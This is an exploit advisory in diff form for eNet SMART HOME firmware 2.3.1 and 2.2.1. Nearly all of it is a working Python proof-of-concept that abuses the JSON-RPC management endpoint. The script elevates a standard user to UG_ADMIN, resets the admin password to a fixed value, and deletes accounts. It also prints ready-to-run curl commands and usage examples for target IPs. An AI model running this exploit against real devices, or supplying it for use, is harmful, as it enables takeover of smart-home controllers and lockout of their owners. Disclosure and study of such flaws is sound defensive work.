@@ -1,0 +1,413 @@
+=============================================================================================================================================
+| # Title     : eNet SMART HOME ≤ 2.3.1 / 2.2.1 – Authenticated Privilege Escalation via JSON‑RPC Management Interface                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.enet-smarthome.com/en/                                                                                          |
+=============================================================================================================================================
+
+[+] Summary    : The eNet Smart Home device firmware (versions 2.3.1 build 46841 and 2.2.1 build 46056) exposes JSON‑RPC management methods that may allow authenticated low‑privileged users to perform unauthorized administrative actions.
+                 Improper server‑side authorization controls on the /jsonrpc/management endpoint may enable privilege escalation via methods such as:
+
+setUserGroup
+
+resetUserPassword
+
+deleteUserAccount
+
+If role validation is insufficient, an authenticated standard user may escalate to administrative privileges by manipulating JSON‑RPC parameters.
+
+[+] POC : 
+
+#!/usr/bin/env python3
+
+import requests
+import json
+import sys
+import argparse
+import random
+from urllib3.exceptions import InsecureRequestWarning
+from colorama import init, Fore, Style
+
+init(autoreset=True)
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class ENetSmartHomeExploit:
+    def __init__(self, target, port, protocol, icp, verbose=False):
+        """
+        Initialize the exploit class
+        
+        Args:
+            target (str): Target IP or hostname
+            port (str/int): Target port
+            protocol (str): http or https
+            icp (str): ICP parameter from URL
+            verbose (bool): Verbose output
+        """
+        self.target = target
+        self.port = port
+        self.protocol = protocol
+        self.icp = icp
+        self.verbose = verbose
+        self.base_url = f"{protocol}://{target}:{port}"
+        self.session = requests.Session()
+        self.session.verify = False  # Ignore SSL certificates
+        self.session.headers.update({
+            'Content-Type': 'application/json; charset=utf-8',
+            'Accept': 'application/json, */*',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+
+    def print_banner(self):
+        """Print tool banner"""
+        banner = f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
+║                                                              ║
+║   {Fore.YELLOW}eNet SMART HOME - Privilege Escalation Exploit by indoushka {Fore.CYAN}            ║
+║   {Fore.WHITE}ZSL-2026-5975 | Discovered by Gjoko 'LiquidWorm' Krstic{Fore.CYAN}   ║
+║   {Fore.RED}Version: 2.3.1 (46841) and 2.2.1 (46056){Fore.CYAN}                  ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+        """
+        print(banner)
+
+    def print_warnings(self):
+        """Print important warnings"""
+        warnings = f"""
+{Fore.RED}╔══════════════════════════════════════════════════════════╗
+║                     ⚠️  indoushka  ⚠️                        ║
+╠══════════════════════════════════════════════════════════════╣
+║ • This exploit requires a valid session cookie               ║
+║ • You must be logged in as a regular user first              ║
+║ • If server validates permissions, exploit will FAIL         ║
+╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
+        """
+        print(warnings)
+
+    def login(self, username, password):
+        """
+        Login to get session cookie
+        
+        Args:
+            username (str): Username
+            password (str): Password
+            
+        Returns:
+            bool: True if login successful
+        """
+        print(f"{Fore.YELLOW}[*] Attempting login as {username}...")
+        
+        url = f"{self.base_url}/jsonrpc/auth"
+        payload = {
+            "jsonrpc": "2.0",
+            "method": "login",
+            "params": {
+                "userName": username,
+                "password": password
+            },
+            "id": 1
+        }
+        
+        try:
+            response = self.session.post(url, json=payload, timeout=10)
+            
+            if response.status_code == 200:
+                data = response.json()
+                if "result" in data and data["result"].get("success"):
+                    print(f"{Fore.GREEN}[+] Login successful!")
+                    if self.verbose:
+                        print(f"{Fore.CYAN}[DEBUG] Cookies: {dict(self.session.cookies)}")
+                    return True
+                else:
+                    print(f"{Fore.RED}[-] Login failed: Invalid credentials")
+                    if self.verbose:
+                        print(f"{Fore.CYAN}[DEBUG] Response: {json.dumps(data, indent=2)}")
+            else:
+                print(f"{Fore.RED}[-] Login failed: HTTP {response.status_code}")
+                
+        except requests.exceptions.RequestException as e:
+            print(f"{Fore.RED}[-] Login error: {e}")
+            
+        return False
+
+    def execute_exploit(self, action, **kwargs):
+        """
+        Execute the exploit
+        
+        Args:
+            action (str): elevate, reset, delete, or test
+            **kwargs: Additional parameters based on action
+            
+        Returns:
+            dict: Response data
+        """
+        url = f"{self.base_url}/jsonrpc/management"
+
+        if action == "elevate":
+            method = "setUserGroup"
+            params = {
+                "userName": kwargs.get("username", "zeroscience"),
+                "userGroup": kwargs.get("group", "UG_ADMIN")
+            }
+        elif action == "reset":
+            method = "resetUserPassword"
+            params = {
+                "userName": kwargs.get("username", "admin"),
+                "defaultPassword": kwargs.get("password", "12345678")
+            }
+        elif action == "delete":
+            method = "deleteUserAccount"
+            params = {
+                "userName": kwargs.get("username", "zeroscience")
+            }
+        elif action == "test":
+            method = kwargs.get("test_type", "getUserList")
+            params = {}
+        else:
+            print(f"{Fore.RED}[-] Invalid action: {action}")
+            return None
+
+        request_id = random.randint(1, 9999)
+        
+        payload = {
+            "jsonrpc": "2.0",
+            "method": method,
+            "params": params,
+            "id": request_id
+        }
+
+        referer = f"{self.base_url}/serverconfiguration.html?icp={self.icp}#Usermanagement"
+        self.session.headers.update({'Referer': referer})
+        
+        print(f"{Fore.YELLOW}[*] Executing: {method}")
+        if self.verbose:
+            print(f"{Fore.CYAN}[DEBUG] URL: {url}")
+            print(f"{Fore.CYAN}[DEBUG] Referer: {referer}")
+            print(f"{Fore.CYAN}[DEBUG] Payload: {json.dumps(payload, indent=2)}")
+        
+        try:
+            response = self.session.post(url, json=payload, timeout=10)
+            
+            if self.verbose:
+                print(f"{Fore.CYAN}[DEBUG] Response status: {response.status_code}")
+                print(f"{Fore.CYAN}[DEBUG] Response headers: {dict(response.headers)}")
+            
+            if response.status_code == 200:
+                data = response.json()
+
+                if "error" in data:
+                    print(f"{Fore.RED}[-] Server returned error:")
+                    print(json.dumps(data["error"], indent=2))
+
+                    if data["error"].get("code") == -32601:
+                        print(f"{Fore.YELLOW}[!] Method not found - Target version may be different")
+                    elif "permission" in str(data["error"]).lower():
+                        print(f"{Fore.RED}[!] Permission denied - Server validates roles")
+                    elif "auth" in str(data["error"]).lower():
+                        print(f"{Fore.RED}[!] Authentication failed - Login required")
+                    
+                    return data
+                else:
+                    print(f"{Fore.GREEN}[+] Success!")
+                    print(json.dumps(data, indent=2))
+
+                    if action == "elevate" and params["userGroup"] == "UG_ADMIN":
+                        print(f"{Fore.GREEN}[+] Privilege escalation completed!")
+                        print(f"{Fore.YELLOW}[!] User {params['userName']} is now admin")
+                    elif action == "reset":
+                        print(f"{Fore.GREEN}[+] Password reset completed!")
+                    elif action == "delete":
+                        print(f"{Fore.GREEN}[+] User deleted successfully!")
+                    elif action == "test" and "result" in data:
+                        print(f"{Fore.GREEN}[+] Test passed - Vulnerability may be present")
+                    
+                    return data
+            else:
+                print(f"{Fore.RED}[-] HTTP Error: {response.status_code}")
+                
+                if response.status_code == 401:
+                    print(f"{Fore.RED}[!] Unauthorized - Login required first")
+                elif response.status_code == 403:
+                    print(f"{Fore.RED}[!] Forbidden - Insufficient permissions or CSRF token required")
+                elif response.status_code == 404:
+                    print(f"{Fore.RED}[!] Not Found - Check URL or endpoint")
+                    
+                if self.verbose:
+                    print(f"{Fore.CYAN}[DEBUG] Response text: {response.text[:200]}")
+                    
+        except requests.exceptions.Timeout:
+            print(f"{Fore.RED}[-] Request timeout (10s) - Server not responding")
+        except requests.exceptions.ConnectionError:
+            print(f"{Fore.RED}[-] Connection failed - Check target and port")
+        except requests.exceptions.RequestException as e:
+            print(f"{Fore.RED}[-] Request error: {e}")
+            
+        return None
+
+    def get_session_info(self):
+        """Get current session information"""
+        print(f"{Fore.YELLOW}[*] Session information:")
+        print(f"    Cookies: {dict(self.session.cookies)}")
+        print(f"    Headers: {dict(self.session.headers)}")
+
+    def generate_curl_command(self, action, **kwargs):
+        """
+        Generate curl command for manual testing
+        
+        Args:
+            action (str): Action type
+            **kwargs: Parameters for the action
+        """
+        if action == "elevate":
+            method = "setUserGroup"
+            params = {
+                "userName": kwargs.get("username", "zeroscience"),
+                "userGroup": kwargs.get("group", "UG_ADMIN")
+            }
+        elif action == "reset":
+            method = "resetUserPassword"
+            params = {
+                "userName": kwargs.get("username", "admin"),
+                "defaultPassword": kwargs.get("password", "12345678")
+            }
+        elif action == "delete":
+            method = "deleteUserAccount"
+            params = {
+                "userName": kwargs.get("username", "zeroscience")
+            }
+        elif action == "test":
+            method = kwargs.get("test_type", "getUserList")
+            params = {}
+        else:
+            return None
+            
+        payload = {
+            "jsonrpc": "2.0",
+            "method": method,
+            "params": params,
+            "id": random.randint(1, 9999)
+        }
+        
+        referer = f"{self.base_url}/serverconfiguration.html?icp={self.icp}#Usermanagement"
+        
+        curl_cmd = f"""
+{Fore.CYAN}# ============================================
+# RECOMMENDED METHOD - Command Line (No browser restrictions)
+# ============================================
+
+# Step 1: Login and save cookies
+curl -k -c cookies.txt -X POST "{self.base_url}/jsonrpc/auth" \\
+  -H "Content-Type: application/json" \\
+  -d '{json.dumps({"jsonrpc":"2.0","method":"login","params":{"userName":"YOUR_USERNAME","password":"YOUR_PASSWORD"},"id":1})}'
+
+# Step 2: Execute exploit
+curl -k -b cookies.txt -X POST "{self.base_url}/jsonrpc/management" \\
+  -H "Content-Type: application/json" \\
+  -H "Referer: {referer}" \\
+  -d '{json.dumps(payload)}'
+
+# ============================================
+# Notes:
+# - Use -k to ignore SSL certificate errors
+# - Cookies saved in cookies.txt
+# - Replace YOUR_USERNAME/YOUR_PASSWORD with actual credentials
+# ============================================{Style.RESET_ALL}
+"""
+        print(curl_cmd)
+
+def main():
+    parser = argparse.ArgumentParser(
+        description="eNet SMART HOME Privilege Escalation Exploit (ZSL-2026-5975)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python3 exploit.py -t 192.168.1.100 -p 443 --icp a1b2c3d4e5 --protocol https --action elevate -u zeroscience -g UG_ADMIN
+  python3 exploit.py -t 192.168.1.100 -p 80 --icp a1b2c3d4e5 --action reset -u admin --password 12345678
+  python3 exploit.py -t 192.168.1.100 -p 443 --icp a1b2c3d4e5 --action delete -u zeroscience
+  python3 exploit.py -t 192.168.1.100 -p 443 --icp a1b2c3d4e5 --action test --curl
+        """
+    )
+    
+    parser.add_argument("-t", "--target", required=True, help="Target IP or hostname")
+    parser.add_argument("-p", "--port", required=True, help="Target port")
+    parser.add_argument("--protocol", choices=["http", "https"], default="https", help="Protocol (default: https)")
+    parser.add_argument("--icp", required=True, help="ICP parameter from URL (required)")
+    parser.add_argument("--action", choices=["elevate", "reset", "delete", "test"], default="test", help="Action to perform")
+    parser.add_argument("--login", action="store_true", help="Login first")
+    parser.add_argument("-U", "--login-username", default="admin", help="Username for login")
+    parser.add_argument("-P", "--login-password", default="12345678", help="Password for login")
+    parser.add_argument("-u", "--username", default="zeroscience", help="Username for the action")
+    parser.add_argument("-g", "--group", choices=["UG_USER", "UG_ADMIN"], default="UG_ADMIN", help="Target group for elevation")
+    parser.add_argument("--password", default="12345678", help="New password for reset action")
+    parser.add_argument("--test-type", choices=["getUserList", "getSystemInfo"], default="getUserList", help="Test type")
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
+    parser.add_argument("--curl", action="store_true", help="Generate curl command only")
+    parser.add_argument("--no-warnings", action="store_true", help="Disable warnings")
+    
+    args = parser.parse_args()
+
+    exploit = ENetSmartHomeExploit(
+        target=args.target,
+        port=args.port,
+        protocol=args.protocol,
+        icp=args.icp,
+        verbose=args.verbose
+    )
+
+    exploit.print_banner()
+
+    if not args.no_warnings:
+        exploit.print_warnings()
+    if args.curl:
+        exploit.generate_curl_command(
+            action=args.action,
+            username=args.username,
+            group=args.group,
+            password=args.password,
+            test_type=args.test_type
+        )
+        sys.exit(0)
+
+    if args.login:
+        if not exploit.login(args.login_username, args.login_password):
+            print(f"{Fore.RED}[-] Login failed. Exiting.")
+            sys.exit(1)
+    else:
+        print(f"{Fore.YELLOW}[!] Warning: Not logging in. Make sure you have a valid session cookie.")
+        print(f"{Fore.YELLOW}[!] Use --login to login first or --curl for manual testing.")
+    if args.action == "elevate":
+        exploit.execute_exploit(
+            action="elevate",
+            username=args.username,
+            group=args.group
+        )
+    elif args.action == "reset":
+        exploit.execute_exploit(
+            action="reset",
+            username=args.username,
+            password=args.password
+        )
+    elif args.action == "delete":
+        exploit.execute_exploit(
+            action="delete",
+            username=args.username
+        )
+    elif args.action == "test":
+        exploit.execute_exploit(
+            action="test",
+            test_type=args.test_type
+        )
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
+        sys.exit(0)
+    except Exception as e:
+        print(f"{Fore.RED}[-] Unexpected error: {e}")
+        sys.exit(1)
+		
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
